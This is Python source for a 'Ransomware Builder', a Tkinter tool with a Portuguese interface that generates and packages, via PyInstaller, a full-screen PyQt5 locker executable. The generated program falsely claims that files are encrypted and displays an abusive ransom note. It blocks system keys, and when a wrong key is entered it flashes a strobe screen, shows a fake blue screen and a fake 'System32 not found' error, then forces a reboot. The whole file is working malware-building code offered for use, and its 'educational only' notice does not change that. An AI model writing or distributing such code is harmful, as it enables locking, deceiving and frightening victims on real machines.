import sys
import os
import shutil
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import PyInstaller.__main__
import re
import base64
from PIL import Image
import io

class RansomwareBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Ransomware Builder")
        self.root.geometry("800x800")
        self.root.resizable(False, False)
        

        self.root.configure(bg="#000000")
        

        main_frame = tk.Frame(root, bg="#000000", padx=20, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        

        title = tk.Label(main_frame, text="RANSOMWARE BUILDER", 
                        font=('Arial', 16, 'bold'), 
                        fg="#63005A", bg="#000000")
        title.pack(pady=(0, 20))
        

        warning_frame = tk.Frame(main_frame, bg="#000000", padx=10, pady=10)
        warning_frame.pack(fill=tk.X, pady=(0, 20))
        

        config_frame = tk.LabelFrame(main_frame, text="Configurações", 
                                     font=('Arial', 11, 'bold'),
                                     fg='white', bg="#000000", 
                                     padx=10, pady=10)
        config_frame.pack(fill=tk.X, pady=(0, 20))
        

        tk.Label(config_frame, text="Senha de saída:", 
                font=('Arial', 10), fg='white', bg="#000000").grid(row=0, column=0, sticky='w', pady=5)
        
        self.password_var = tk.StringVar(value="12345")
        password_entry = tk.Entry(config_frame, textvariable=self.password_var, 
                                 font=('Arial', 10), width=20, bg="#000000", fg='white',
                                 insertbackground='white')
        password_entry.grid(row=0, column=1, sticky='w', pady=5, padx=(10, 0))
        
        tk.Label(config_frame, text="", 
                font=('Arial', 8), fg='#888', bg="#000000").grid(row=0, column=2, sticky='w', pady=5, padx=(10, 0))
        

        tk.Label(config_frame, text="Nome do executável:", 
                font=('Arial', 10), fg='white', bg="#000000").grid(row=1, column=0, sticky='w', pady=5)
        
        self.exe_name_var = tk.StringVar(value="JesterRansomware")
        exe_name_entry = tk.Entry(config_frame, textvariable=self.exe_name_var, 
                                 font=('Arial', 10), width=20, bg="#000000", fg='white',
                                 insertbackground='white')
        exe_name_entry.grid(row=1, column=1, sticky='w', pady=5, padx=(10, 0))
        
        tk.Label(config_frame, text=".exe", font=('Arial', 10), fg='white', bg="#000000").grid(row=1, column=2, sticky='w')
        

        preview_frame = tk.Frame(config_frame, bg="#000000")
        preview_frame.grid(row=2, column=0, columnspan=4, pady=10, sticky='we')
        
        tk.Label(preview_frame, text="Logo personalizado:", 
                font=('Arial', 10), fg='white', bg="#000000").pack(side=tk.LEFT, padx=(0, 10))
        
        self.logo_path_var = tk.StringVar(value="")
        logo_path_entry = tk.Entry(preview_frame, textvariable=self.logo_path_var, 
                                  font=('Arial', 10), width=30, bg="#000000", fg='white')
        logo_path_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(preview_frame, text="Selecionar", 
                 command=self.select_logo,
                 bg="#000000", fg='white', relief=tk.FLAT,
                 padx=10).pack(side=tk.LEFT)
        

        self.preview_label = tk.Label(config_frame, bg="#000000", width=30, height=5, relief=tk.SUNKEN)
        self.preview_label.grid(row=3, column=0, columnspan=4, pady=10)
        
        options_frame = tk.LabelFrame(main_frame, text="Opções Avançadas", 
                                      font=('Arial', 11, 'bold'),
                                      fg='white', bg="#000000", 
                                      padx=10, pady=10)
        options_frame.pack(fill=tk.X, pady=(0, 20))
        
        self.block_keys_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text="Bloquear teclas do sistema (Windows, Alt, Tab, etc.)",
                      variable=self.block_keys_var,
                      bg='#2b2b2b', fg='white', selectcolor="#000000",
                      font=('Arial', 10)).pack(anchor='w', pady=2)
        
        self.show_logo_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text="Mostrar logo no programa",
                      variable=self.show_logo_var,
                      bg='#2b2b2b', fg='white', selectcolor="#000000",
                      font=('Arial', 10)).pack(anchor='w', pady=2)
        
        self.bsod_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_frame, text="Ativar simulação de BSOD",
                      variable=self.bsod_var,
                      bg='#2b2b2b', fg='white', selectcolor="#000000",
                      font=('Arial', 10)).pack(anchor='w', pady=2)
        
        tk.Label(config_frame, text="Mensagem personalizada (opcional):", 
                font=('Arial', 10), fg='white', bg="#000000").grid(row=4, column=0, sticky='w', pady=5)
        
        self.custom_message = tk.Text(config_frame, height=4, width=50, 
                                     bg="#000000", fg='white', insertbackground='white')
        self.custom_message.grid(row=5, column=0, columnspan=4, pady=5, sticky='we')
        
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=(0, 10))
        

        button_frame = tk.Frame(main_frame, bg='#2b2b2b')
        button_frame.pack()
        
        tk.Button(button_frame, text="Gerar Executável", 
                 command=self.build_exe,
                 bg="#41023d", fg='white', font=('Arial', 11, 'bold'),
                 padx=20, pady=10, relief=tk.FLAT).pack(side=tk.LEFT, padx=5)
        
        tk.Button(button_frame, text="Sair", 
                 command=root.quit,
                 bg="#000000", fg='white', font=('Arial', 11),
                 padx=20, pady=10, relief=tk.FLAT).pack(side=tk.LEFT, padx=5)
        

        self.status_label = tk.Label(main_frame, text="Pronto para gerar", 
                                     font=('Arial', 9), fg='#888', bg='#2b2b2b')
        self.status_label.pack(pady=(10, 0))
    
    def select_logo(self):
        filename = filedialog.askopenfilename(
            title="Selecione um logo",
            filetypes=[("Image files", "*.png *.jpg *.jpeg *.bmp *.ico")]
        )
        if filename:
            self.logo_path_var.set(filename)
            self.show_logo_preview(filename)
    
    def show_logo_preview(self, image_path):
        """Mostra preview do logo selecionado"""
        try:

            img = Image.open(image_path)
            img.thumbnail((200, 100))
            

            from PIL import ImageTk
            photo = ImageTk.PhotoImage(img)
            self.preview_label.config(image=photo)
            self.preview_label.image = photo  
        except Exception as e:
            self.preview_label.config(text=f"Erro ao carregar preview:\n{str(e)}")
    
    def image_to_base64(self, image_path):
        """Converte imagem para base64 para embutir no código"""
        with open(image_path, 'rb') as img_file:
            return base64.b64encode(img_file.read()).decode('utf-8')
    
    def create_ransomware_code(self, password, block_keys, show_logo, bsod, custom_message, logo_base64=None):
        """Cria o código do ransomware com as configurações"""
        
        if custom_message.strip():
            ransom_text = '\\n'.join(custom_message.split('\n'))
        else:
            ransom_text = "HELLO Looser\\nYour System is Fucked\\nYOUR FILES\\nYOUR PICS\\nYOUR EMAILS\\nYOUR SOCIAL LIFE\\nAND YOU\\nWANT IT BACK ?\\nBAD FOR YOU HAHAHA"
        
        block_keys_code = ""
        if block_keys:
            block_keys_code = """
        # Bloquear teclas do sistema
        blocked_keys = ['windows', 'alt', 'tab', 'ctrl', 'esc', 'delete', 'f4']
        for k in blocked_keys:
            try:
                keyboard.block_key(k)
            except:
                pass
"""
        
        logo_code = ""
        if show_logo and logo_base64:
            logo_code = f"""
        # Carregar logo embutido
        logo_data = base64.b64decode("{logo_base64}")
        pixmap = QPixmap()
        pixmap.loadFromData(logo_data)
        self.logo_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation))
"""
        elif show_logo:
            logo_code = """
        # Tentar carregar logo do arquivo (fallback)
        try:
            import sys
            if hasattr(sys, '_MEIPASS'):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))
            
            logo_path = os.path.join(base_path, 'logo.png')
            if os.path.exists(logo_path):
                pixmap = QPixmap(logo_path)
                if not pixmap.isNull():
                    self.logo_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        except:
            pass
"""
        
        return f'''import sys
import random
import os
import base64
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, 
                             QLabel, QTextEdit, QLineEdit, QPushButton, QMessageBox)
from PyQt5.QtGui import QPixmap
from PyQt5.QtCore import Qt, QTimer
import keyboard

class GlitchScreen(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        self.colors = ["black", "red"]
        self.current_color_idx = 0
        
        self.layout = QVBoxLayout()
        self.label = QLabel("DON'T EVEN TRY!")
        self.label.setAlignment(Qt.AlignCenter)
        self.layout.addWidget(self.label)
        self.setLayout(self.layout)

        self.strobe_timer = QTimer(self)
        self.strobe_timer.timeout.connect(self.flash)
        self.strobe_timer.start(100)
        QTimer.singleShot(5000, self.close)

    def flash(self):
        color = self.colors[self.current_color_idx]
        self.setStyleSheet(f"background-color: {{color}};")
        text_color = "red" if color == "black" else "black"
        self.label.setStyleSheet(f"font-size: 80px; font-weight: bold; color: {{text_color}}; font-family: Impact;")
        self.current_color_idx = (self.current_color_idx + 1) % len(self.colors)

class JesterRansomware(QWidget):
    def __init__(self):
        super().__init__()
        self.progress = 0 
        
        self.setStyleSheet("background-color: black;")
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint) 
        self.main_layout = QVBoxLayout()
        self.main_layout.setAlignment(Qt.AlignCenter)

        # Logo
        self.logo_label = QLabel()
        self.logo_label.setAlignment(Qt.AlignCenter)
        self.main_layout.addWidget(self.logo_label)
        {logo_code}
        self.header = QLabel("Your files have been encrypted!")
        self.header.setStyleSheet("color: red; font-size: 28px; font-weight: bold; font-family: 'Courier New';")
        self.header.setAlignment(Qt.AlignCenter)
        self.main_layout.addWidget(self.header)

        self.message_box = QTextEdit()
        ransom_text = "{ransom_text}"
        self.message_box.setText(ransom_text)
        self.message_box.setReadOnly(True)
        self.message_box.setFixedSize(600, 300)
        self.message_box.setStyleSheet("""
            QTextEdit {{
                background-color: black;
                color: red;
                border: 2px solid red;
                font-family: 'Courier New';
                font-size: 16px;
                font-weight: bold;
                padding: 10px;
            }}
        """)
        self.main_layout.addWidget(self.message_box, alignment=Qt.AlignCenter)

        self.input_layout = QHBoxLayout()
        self.input_layout.setAlignment(Qt.AlignCenter)

        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText("Enter Decryption Key...")
        self.key_input.setFixedWidth(300)
        self.key_input.setStyleSheet("background-color: black; color: red; border: 1px solid red; padding: 5px;")
        
        self.submit_btn = QPushButton("Check Key")
        self.submit_btn.setFixedWidth(100)
        self.submit_btn.setStyleSheet("""
            QPushButton {{ background-color: black; color: red; border: 1px solid red; padding: 5px; }}
            QPushButton:hover {{ background-color: red; color: black; }}
        """)
        self.submit_btn.clicked.connect(self.check_key)

        self.input_layout.addWidget(self.key_input)
        self.input_layout.addWidget(self.submit_btn)
        self.main_layout.addLayout(self.input_layout)

        self.setLayout(self.main_layout)
        {block_keys_code}
    def check_key(self):
        if self.key_input.text() == "{password}":
            sys.exit()
        else:
            self.scare = GlitchScreen()
            self.scare.showFullScreen()
            QTimer.singleShot(5000, self.trigger_bsod)

    def trigger_bsod(self):
        self.showFullScreen()
        self.raise_()
        self.activateWindow()

        while self.main_layout.count():
            item = self.main_layout.takeAt(0)
            if item.widget(): 
                item.widget().deleteLater()
            elif item.layout():
                self.clear_layout(item.layout())

        self.setStyleSheet("background-color: #0078D7;")
        self.setCursor(Qt.BlankCursor)
        
        bsod_vbox = QVBoxLayout()
        bsod_vbox.setContentsMargins(150, 150, 100, 100)
        
        sad_face = QLabel(":(")
        sad_face.setStyleSheet("color: black; font-size: 160px; font-family: 'Segoe UI';")
        
        msg = QLabel("Your PC ran into a problem and needs to restart. We're just\\n"
                     "collecting some error info, and then we'll restart for you.")
        msg.setStyleSheet("color: black; font-size: 30px; font-family: 'Segoe UI';")
        
        self.percent_label = QLabel("0% complete")
        self.percent_label.setStyleSheet("color: black; font-size: 30px; font-family: 'Segoe UI';")

        bsod_vbox.addWidget(sad_face)
        bsod_vbox.addWidget(msg)
        bsod_vbox.addSpacing(40)
        bsod_vbox.addWidget(self.percent_label)
        bsod_vbox.addStretch()

        self.main_layout.addLayout(bsod_vbox)

        self.progress_timer = QTimer(self)
        self.progress_timer.timeout.connect(self.update_progress)
        self.progress_timer.start(200)

    def clear_layout(self, layout):
        if layout is not None:
            while layout.count():
                item = layout.takeAt(0)
                widget = item.widget()
                if widget is not None:
                    widget.deleteLater()
                else:
                    self.clear_layout(item.layout())

    def update_progress(self):
        if self.progress < 55:
            self.progress += random.randint(1, 4)
            if self.progress > 55: self.progress = 55
            self.percent_label.setText(f"{{self.progress}}% complete")
        
        if self.progress == 55:
            self.progress_timer.stop()
            QTimer.singleShot(800, self.show_critical_error)

    def show_critical_error(self):
        msg_box = QMessageBox(self)
        msg_box.setIcon(QMessageBox.Critical)
        msg_box.setWindowTitle("Fatal Error")
        msg_box.setText("Error: System32 not found.")
        msg_box.setInformativeText("A critical system directory is missing. Windows must restart to attempt repair.")
        msg_box.setStandardButtons(QMessageBox.Ok)
        msg_box.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.Dialog)
        
        result = msg_box.exec_()
        if result == QMessageBox.Ok:
            self.restart_pc()

    def restart_pc(self):
        if sys.platform == "win32":
            os.system("shutdown /r /t 1")
        else:
            sys.exit()

    def keyPressEvent(self, event):
        pass 

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = JesterRansomware()
    ex.showFullScreen()
    sys.exit(app.exec_())'''
    
    def build_exe(self):
        password = self.password_var.get().strip()
        if not password:
            messagebox.showerror("Erro", "A senha não pode estar vazia!")
            return
        
        exe_name = self.exe_name_var.get().strip()
        if not exe_name:
            exe_name = "JesterRansomware"
        
        build_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'build_temp')
        if not os.path.exists(build_dir):
            os.makedirs(build_dir)
        
        try:
            self.progress.start()
            self.status_label.config(text="Preparando arquivos...")
            self.root.update()
            
            logo_base64 = None
            if self.logo_path_var.get() and os.path.exists(self.logo_path_var.get()):
                try:
                    img = Image.open(self.logo_path_var.get())
                    img = img.convert('RGBA')
                    img.thumbnail((400, 400), Image.Resampling.LANCZOS)
                    
                    temp_logo = os.path.join(build_dir, 'logo_temp.png')
                    img.save(temp_logo, format='PNG', optimize=True)
                    logo_base64 = self.image_to_base64(temp_logo)
                    
                    self.status_label.config(text="Logo processado com sucesso!")
                except Exception as e:
                    print(f"Erro ao processar logo: {e}")
                    logo_base64 = None
            
            ransomware_code = self.create_ransomware_code(
                password,
                self.block_keys_var.get(),
                self.show_logo_var.get(),
                self.bsod_var.get(),
                self.custom_message.get("1.0", tk.END).strip(),
                logo_base64
            )
            

            modified_source = os.path.join(build_dir, 'ransomware_final.py')
            with open(modified_source, 'w', encoding='utf-8') as f:
                f.write(ransomware_code)
            
            self.status_label.config(text="Gerando executável... (pode levar alguns minutos)")
            self.root.update()
            
            output_dir = os.path.dirname(os.path.abspath(__file__))
            pyinstaller_args = [
                modified_source,
                '--onefile',  
                '--windowed',  
                '--name', exe_name,
                '--distpath', output_dir,  
                '--workpath', os.path.join(build_dir, 'build'),
                '--specpath', build_dir,
                '--hidden-import', 'PyQt5.sip',
                '--hidden-import', 'keyboard',
                '--noconfirm',
                '--clean'  
            ]
            
            PyInstaller.__main__.run(pyinstaller_args)
            
            self.progress.stop()
            
            exe_path = os.path.join(output_dir, f"{exe_name}.exe")
            
            if os.path.exists(exe_path):
                self.status_label.config(text="Executável gerado com sucesso!")
                

                try:
                    shutil.rmtree(build_dir)
                except:
                    pass
                
                messagebox.showinfo("Sucesso", 
                                   f"Executável '{exe_name}.exe' gerado com sucesso!\n\n"
                                   f"Local: {exe_path}\n"
                                   f"Senha configurada: {password}\n\n"
                                   f"AVISO: Use apenas para fins educacionais!")
            else:
                raise Exception("Executável não foi criado")
            
        except Exception as e:
            self.progress.stop()
            self.status_label.config(text="Erro ao gerar executável")
            messagebox.showerror("Erro", f"Erro ao gerar executável:\n{str(e)}")
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    required_packages = ['pyinstaller', 'pyqt5', 'keyboard', 'pillow']
    
    for package in required_packages:
        try:
            if package == 'pyinstaller':
                import PyInstaller
            elif package == 'pyqt5':
                from PyQt5 import QtWidgets
            elif package == 'keyboard':
                import keyboard
            elif package == 'pillow':
                from PIL import Image
        except ImportError:
            print(f"Instalando {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    root = tk.Tk()
    app = RansomwareBuilder(root)
    root.mainloop()